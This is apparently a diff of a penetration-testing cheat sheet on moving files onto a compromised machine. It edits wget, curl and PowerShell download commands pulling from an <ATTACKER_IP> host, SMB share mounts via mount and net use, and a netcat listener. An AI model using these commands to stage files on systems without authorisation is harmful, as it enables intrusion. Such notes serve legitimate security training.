@@ -18,9 +18,12 @@ php -S 0.0.0.0:80
 ### Victim (Receiver)
 
 ```
-Linux `wget http://<ATTACKER_IP>/filename` ya `curl -O http://<ATTACKER_IP>/filename`
+Linux `wget http://<ATTACKER_IP>/filename  
+curl -O http://<ATTACKER_IP>/filename
     
-Windows (PowerShell) `iwr -uri http://<ATTACKER_IP>/filename -OutFile filename`
+Windows (PowerShell) iwr -uri http://<ATTACKER_IP>/filename -OutFile filename
+wget http://ip/filename -o filename
+curl http://ip/filename -O filename
     
 ```
 
@@ -56,9 +59,9 @@ impacket-smbserver shareName /path/to/folder -smb2support
 ### Victim (Receiver - Mounting SMB)
 
 ```
-- **Linux:** `mount -t cifs //<ATTACKER_IP>/shareName /mnt -o username=guest,password=guest`
+- **Linux:** mount -t cifs //<ATTACKER_IP>/shareName /mnt -o username=guest,password=guest
     
-- **Windows:** `net use Z: \\<ATTACKER_IP>\shareName`
+- **Windows:** net use Z: \\<ATTACKER_IP>\shareName
     
 ```
 ## 4. Netcat (The "Raw" Way)
@@ -67,11 +70,10 @@ _Best for: When no other tools are allowed or available._
 
 ### Attacker (Sender)
 
-Bash
 
 ```
 # Prepare the file to be sent
-nc -l -p 1234 < file_to_send
+nc -lvnp 1234 < file_to_send
 ```
 
 ### Victim (Receiver)
